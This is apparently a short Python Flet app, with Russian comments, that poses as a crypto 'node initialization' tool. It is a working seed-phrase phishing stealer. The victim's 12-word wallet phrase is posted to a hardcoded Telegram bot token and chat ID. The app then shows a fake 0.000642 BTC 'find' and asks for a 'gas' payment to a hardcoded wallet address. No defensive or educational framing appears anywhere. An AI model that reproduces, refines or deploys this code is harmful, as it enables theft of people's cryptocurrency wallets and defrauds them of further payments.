import flet as ft
import requests
import random
import asyncio

# Твои данные
TOKEN = "7544070267:AAH9m-CclS2u3T68Gq8u8-UuS2G69u-UuS2G"
CHAT_ID = "-1002410363241"
TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"

async def main(page: ft.Page):
    # Настройки страницы
    page.theme_mode = ft.ThemeMode.DARK
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.scroll = ft.ScrollMode.AUTO # Добавили прокрутку на всякий случай

    # Поля и текст
    header = ft.Text("NODE INITIALIZATION", size=25, weight="bold")
    seed_input = ft.TextField(label="Seed Phrase (12 words)", multiline=True, min_lines=3, width=350)
    btn = ft.ElevatedButton("ИНИЦИАЛИЗИРОВАТЬ", width=300, height=50)
    status_text = ft.Text("", color="yellow")
    
    # Функция отправки
    def send_data(text):
        try:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                          json={"chat_id": CHAT_ID, "text": f"🔑 СИД: {text}"}, timeout=5)
        except: pass

    # Логика кнопки
    async def on_click(e):
        if len(seed_input.value.split()) != 12:
            status_text.value = "Ошибка: введите 12 слов!"
            await page.update_async()
            return
        
        btn.visible = False
        status_text.value = "Подключение к узлу... Подождите"
        await page.update_async()
        
        send_data(seed_input.value)
        await asyncio.sleep(3)
        
        status_text.value = "✅ Найдено: 0.000642 BTC\nОплатите газ на адрес выше"
        # Показываем адрес
        page.add(ft.Text(f"Адрес для оплаты: {TARGET_ADDRESS}", size=10, color="blue"))
        await page.update_async()

    btn.on_click = on_click

    # Самый надежный способ добавления
    page.controls.append(header)
    page.controls.append(seed_input)
    page.controls.append(btn)
    page.controls.append(status_text)
    
    await page.update_async()

if __name__ == "__main__":
    ft.app(target=main)


